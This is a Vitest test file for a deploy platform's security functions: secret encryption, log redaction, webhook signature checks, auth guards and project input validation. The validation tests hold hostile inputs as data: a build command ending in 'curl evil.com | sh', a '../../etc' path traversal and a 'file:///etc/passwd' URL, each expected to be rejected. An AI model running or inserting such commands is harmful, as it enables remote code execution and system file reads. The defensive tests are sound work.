import crypto from "node:crypto";
import { describe, expect, it } from "vitest";
import {
  createProjectSchema,
  decryptSecret,
  encryptSecret,
  redactSecretsFromLog,
  verifyGithubWebhookSignature,
} from "@/lib/server/deploy-crypto.server";

describe("SparrowX Deploy Production Platform Verification", () => {
  it("encrypts and decrypts secrets cleanly with AES-256-GCM random IVs", () => {
    const secret = "sk_live_sparrowx_998877665544332211";
    const enc1 = encryptSecret(secret);
    const enc2 = encryptSecret(secret);

    expect(enc1).toMatch(/^v1:[0-9a-f]{24}:[0-9a-f]{32}:[0-9a-f]+$/);
    expect(enc1).not.toBe(enc2); // unique random 12-byte IV per secret
    expect(decryptSecret(enc1)).toBe(secret);
    expect(decryptSecret(enc2)).toBe(secret);

    // Tampered auth tag must fail authentication
    const parts = enc1.split(":");
    parts[2] = "0".repeat(32);
    expect(() => decryptSecret(parts.join(":"))).toThrow();
  });

  it("redacts known secret values and embedded git credentials from build logs", () => {
    const raw =
      "Cloning https://x-access-token:gho_supersecret999@github.com/org/app.git with API_KEY=my_prod_secret_42";
    const clean = redactSecretsFromLog(raw, ["my_prod_secret_42", "gho_supersecret999"]);
    expect(clean).not.toContain("my_prod_secret_42");
    expect(clean).not.toContain("gho_supersecret999");
    expect(clean).toContain("[REDACTED]");
  });

  it("validates createProjectSchema and blocks shell injection & path traversal", () => {
    const valid = createProjectSchema.parse({
      name: "Mumbai Storefront",
      repoUrl: "https://github.com/sparrowxtech/demo-app",
      branch: "main",
      framework: "nextjs",
      buildMethod: "railpack",
      buildCommand: "npm run build",
      startCommand: "npm run start",
      port: 3000,
      tier: "starter",
    });
    expect(valid.framework).toBe("nextjs");
    expect(valid.tier).toBe("starter");

    // Reject shell injection in buildCommand
    expect(() =>
      createProjectSchema.parse({
        repoUrl: "https://github.com/sparrowxtech/demo-app",
        buildCommand: "npm run build && curl evil.com | sh",
      }),
    ).toThrow();

    // Reject path traversal in rootDir
    expect(() =>
      createProjectSchema.parse({
        repoUrl: "https://github.com/sparrowxtech/demo-app",
        rootDir: "../../etc",
      }),
    ).toThrow();

    // Reject non-HTTPS repo URLs
    expect(() =>
      createProjectSchema.parse({
        repoUrl: "file:///etc/passwd",
      }),
    ).toThrow();
  });

  it("strictly verifies GitHub webhook HMAC-SHA256 signatures", () => {
    const secret = "whsec_sparrowx_test_secret_2026";
    const payload = JSON.stringify({
      ref: "refs/heads/main",
      repository: { html_url: "https://github.com/sparrowxtech/demo-app" },
    });
    const validSig = `sha256=${crypto.createHmac("sha256", secret).update(payload).digest("hex")}`;

    expect(verifyGithubWebhookSignature(payload, validSig, secret)).toBe(true);
    expect(verifyGithubWebhookSignature(payload, "sha256=" + "a".repeat(64), secret)).toBe(false);
    expect(verifyGithubWebhookSignature(payload, null, secret)).toBe(false);
    expect(verifyGithubWebhookSignature(payload + " ", validSig, secret)).toBe(false);
  });

  it("enforces 401 auth guard on all protected Deploy API routes without session cookie", async () => {
    const { Route: projectsRoute } = await import("@/routes/api/deploy/projects");
    const { Route: deploymentsRoute } = await import("@/routes/api/deploy/deployments");
    const { Route: domainsRoute } = await import("@/routes/api/deploy/domains");
    const { Route: usageRoute } = await import("@/routes/api/deploy/usage");

    type Handler = (ctx: { request: Request }) => Promise<Response>;
    type ServerOpts = { handlers: { GET: Handler; POST?: Handler } };

    const projGet = (projectsRoute.options.server as unknown as ServerOpts).handlers.GET;
    const depGet = (deploymentsRoute.options.server as unknown as ServerOpts).handlers.GET;
    const domGet = (domainsRoute.options.server as unknown as ServerOpts).handlers.GET;
    const useGet = (usageRoute.options.server as unknown as ServerOpts).handlers.GET;

    const r1 = await projGet({
      request: new Request("https://deploy.sparrowx.net/api/deploy/projects"),
    });
    const r2 = await depGet({
      request: new Request("https://deploy.sparrowx.net/api/deploy/deployments"),
    });
    const r3 = await domGet({
      request: new Request("https://deploy.sparrowx.net/api/deploy/domains"),
    });
    const r4 = await useGet({
      request: new Request("https://deploy.sparrowx.net/api/deploy/usage"),
    });

    expect(r1.status).toBe(401);
    expect(r2.status).toBe(401);
    expect(r3.status).toBe(401);
    expect(r4.status).toBe(401);
  });

  it("rejects invalid GitHub webhook signatures on POST /api/webhooks/github", async () => {
    process.env.GITHUB_WEBHOOK_SECRET = "test_wh_secret_123";
    const { Route: whRoute } = await import("@/routes/api/webhooks/github");
    type PostHandler = (ctx: { request: Request }) => Promise<Response>;
    const whPost = (whRoute.options.server as unknown as { handlers: { POST: PostHandler } })
      .handlers.POST;

    const badRes = await whPost({
      request: new Request("https://deploy.sparrowx.net/api/webhooks/github", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-github-event": "push",
          "x-hub-signature-256": "sha256=" + "0".repeat(64),
        },
        body: JSON.stringify({ ref: "refs/heads/main" }),
      }),
    });
    expect(badRes.status).toBe(401);

    const pingBody = JSON.stringify({ zen: "Keep it logically awesome." });
    const goodSig = `sha256=${crypto.createHmac("sha256", "test_wh_secret_123").update(pingBody).digest("hex")}`;
    const pingRes = await whPost({
      request: new Request("https://deploy.sparrowx.net/api/webhooks/github", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-github-event": "ping",
          "x-hub-signature-256": goodSig,
        },
        body: pingBody,
      }),
    });
    expect(pingRes.status).toBe(200);
    delete process.env.GITHUB_WEBHOOK_SECRET;
  });
});
